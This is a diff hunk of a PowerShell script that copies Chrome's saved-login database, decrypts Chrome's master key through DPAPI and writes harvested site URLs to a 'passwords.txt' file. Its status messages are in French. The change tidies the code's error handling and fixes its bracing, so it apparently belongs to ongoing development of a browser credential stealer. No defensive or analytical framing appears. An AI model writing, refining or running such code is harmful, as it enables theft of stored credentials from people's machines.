@@ -45,35 +45,31 @@ $localStatePath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Local State"
 $loginDataPath  = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"
 $outputPath     = "$basePath\passwords.txt"
 
-if (Test-Path $loginDataPath) {
-    try {
-        $tempDb = "$basePath\login_temp.db"
-        Copy-Item $loginDataPath -Destination $tempDb -Force
+$tempDb = "$basePath\login_temp.db"
+Copy-Item $loginDataPath -Destination $tempDb -Force -ErrorAction SilentlyContinue
 
-        $localState = Get-Content $localStatePath -Raw | ConvertFrom-Json
-        $encryptedKey = [Convert]::FromBase64String($localState.os_crypt.encrypted_key)
-        $encryptedKey = $encryptedKey[5..($encryptedKey.Length - 1)]
+if (Test-Path $tempDb) {
+    $localState = Get-Content $localStatePath -Raw | ConvertFrom-Json
+    $encryptedKey = [Convert]::FromBase64String($localState.os_crypt.encrypted_key)
+    $encryptedKey = $encryptedKey[5..($encryptedKey.Length - 1)]
 
-        Add-Type -AssemblyName System.Security
-        $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
+    Add-Type -AssemblyName System.Security
+    $masterKey = [System.Security.Cryptography.ProtectedData]::Unprotect($encryptedKey, $null, [System.Security.Cryptography.DataProtectionScope]::CurrentUser)
 
-        Add-Content -Path $outputPath -Value "=== CREDENTIALS CHROME ==="
-        Add-Content -Path $outputPath -Value "[+] Clé DPAPI déchiffrée avec succès."
+    Add-Content -Path $outputPath -Value "=== CREDENTIALS CHROME ==="
+    Add-Content -Path $outputPath -Value "[+] Clé DPAPI déchiffrée avec succès."
 
-        $dbBytes = [System.IO.File]::ReadAllBytes($tempDb)
-        $textContent = [System.Text.Encoding]::UTF8.GetString($dbBytes)
+    $dbBytes = [System.IO.File]::ReadAllBytes($tempDb)
+    $textContent = [System.Text.Encoding]::UTF8.GetString($dbBytes)
 
-        $urls = [regex]::Matches($textContent, 'https?://[a-zA-Z0-9\-\.]+\.[a-zA-Z]{2,}(?:/[^\s"]*)?')
-        foreach ($u in $urls | Select-Object -Unique) {
-            if ($u.Value -notmatch "google|gstatic|googleapis|apple|mozilla") {
-                Add-Content -Path $outputPath -Value "URL: $($u.Value)"
-            }
-        
-
-       Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
-    } catch {
-        Add-Content -Path $outputPath -Value "[!] Erreur lors de l'extraction native : $_"
+    $urls = [regex]::Matches($textContent, 'https?://[a-zA-Z0-9\-\.]+\.[a-zA-Z]{2,}(?:/[^\s"]*)?')
+    foreach ($u in $urls | Select-Object -Unique) {
+        if ($u.Value -notmatch "google|gstatic|googleapis|apple|mozilla") {
+            Add-Content -Path $outputPath -Value "URL: $($u.Value)"
+        }
     }
+
+    Remove-Item $tempDb -Force -ErrorAction SilentlyContinue
 } else {
     Add-Content -Path $outputPath -Value "[!] Aucun profil Chrome trouvé sur cette machine."
 }
